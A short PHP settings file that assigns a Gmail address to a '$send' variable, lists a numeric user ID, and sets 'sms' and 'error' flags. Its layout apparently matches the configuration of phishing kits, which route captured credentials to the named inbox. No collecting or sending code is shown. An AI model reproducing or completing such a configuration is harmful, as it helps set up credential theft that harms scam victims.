<?php
$send = "zaxbilal90@gmail.com";
$user_ids=array("1605271958");
$sms='1';
$error='1';
?>
